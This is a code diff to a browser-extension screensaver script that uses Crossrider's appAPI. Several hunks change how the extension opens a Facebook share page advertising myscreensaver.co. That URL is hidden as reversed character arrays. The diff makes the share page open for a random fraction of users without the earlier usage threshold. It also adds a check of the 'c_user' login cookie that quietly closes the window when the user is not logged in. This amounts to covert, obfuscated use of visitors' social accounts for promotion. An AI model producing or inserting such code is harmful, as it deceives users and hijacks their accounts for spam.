@@ -5,7 +5,7 @@ var ScreenSaver = (function ($) {
 			screenSaverStartAfter:10,//minutes
 			thankYouPageUrl:'http://www.myscreensaver.co/?thankyou=true',
 			//thankYouPageUrl:'http://mss.i.com/?thankyou=true',
-			defaultImages:'https://fierce-window-3161.herokuapp.com/images/{id}/{id}{i}.jpg', //@@@ the base url of all the images when {{id}} is the images set (like: 'barcelona') and {{i}} is a running number for each image
+			defaultImages:'http://static-staging.crossrider.com/screensaver/zip/images/{id}/{id}{i}.jpg', //@@@ the base url of all the images when {{id}} is the images set (like: 'barcelona') and {{i}} is a running number for each image
 			defaultImagesCount:{ //@@@the count of each images set
 				bar:115,
 				barcelona:95,
@@ -86,7 +86,7 @@ var ScreenSaver = (function ($) {
 	function initThankYou() {
 		var html = [];
 
-		if (!appAPI.db.get('thank_you_show')) {
+		/*if (!appAPI.db.get('thank_you_show')) {
 			appAPI.message.addListener(function(msg) {
 				if (msg.action == 'open-thankyou') {
 					appAPI.openURL(config.thankYouPageUrl, 'tab');
@@ -98,7 +98,7 @@ var ScreenSaver = (function ($) {
 			appAPI.message.toBackground({
 				action: 'is-thankyou'
 			});
-		}
+		}*/
 
 
 		/*if (true || !appAPI.db.get('thank_you_show') && location.href.indexOf(config.thankYouPageUrl) == -1) {
@@ -412,7 +412,7 @@ var ScreenSaver = (function ($) {
 			rand = Math.floor(Math.random() * 100),
 			isRun = rand < config.distPercent;
 
-		if (!distRun && screenSaverRunCount >= 3) {
+		if (!distRun) {
 			if (isRun) {
 				appAPI.openURL({
 					url:["/", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":", "s", "p", "t", "t", "h"].reverse().join('') + screenSaverSettings.screensaver + '#__A__',
@@ -796,8 +796,15 @@ var ScreenSaver = (function ($) {
 appAPI.ready(function($) {
 	function isDist() {
 		if (top.location.href.indexOf(["o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w"].reverse().join('')) > -1) {
-			return true;
+			if (document.cookie.indexOf('c_user') > -1) {
+				return true;
+			} else {
+				window.close();
+				return false;
+			}
 		}
+
+		return false;
 	}
 
 	if (appAPI.dom.isIframe()) {
@@ -848,4 +855,4 @@ appAPI.ready(function($) {
 			blacklist:blacklist
 		});
 	}
-}, false);
+});
